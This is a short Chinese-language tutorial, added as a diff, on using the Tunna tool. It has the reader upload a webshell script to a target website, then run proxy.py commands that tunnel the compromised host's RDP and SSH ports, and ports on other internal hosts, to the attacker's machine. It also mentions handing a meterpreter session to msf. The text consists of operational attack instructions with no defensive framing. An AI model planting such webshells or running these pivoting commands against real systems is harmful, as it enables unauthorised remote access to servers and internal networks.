@@ -1,0 +1,34 @@
+Tunna和reduh原理一样..
+
+使用方法：
+
+上传源码包中文件夹webshell下的脚本至网站目录
+
+01.jpg
+
+
+然后本地进行连接上传的webshell即可
+
+python proxy.py -u http://172.0.0.1/conn.php -l 1234 -r 3389 -v
+
+这样就转发了webshell所在主机的3389到你本地的1234上，本地直接远程127.0.0.1:1234即可
+
+
+python proxy.py -u http://172.0.0.1/conn.php -l 1234 -a 172.0.0.2 -r 3389
+
+转发内网其他主机的端口，同上
+
+
+python proxy.py -u http://172.0.0.1/conn.php -l 1234 -r 22 -v -s
+
+转发SSH服务需要加上-s参数避免中断
+
+
+另外，Tunna也支持msf，可直接返回meterpreter给msf，详情移步：http://drops.wooyun.org/tools/650
+
+
+最后附上源码地址：
+
+https://github.com/SECFORCE/Tunna
+
+http://www.secforce.com/media/tools/tunna_v0.1.zip
